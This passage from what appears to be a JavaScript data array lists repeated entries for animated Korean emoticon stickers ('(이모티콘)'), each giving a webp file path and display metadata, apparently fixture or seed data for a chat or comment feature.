        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
    {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
    },
];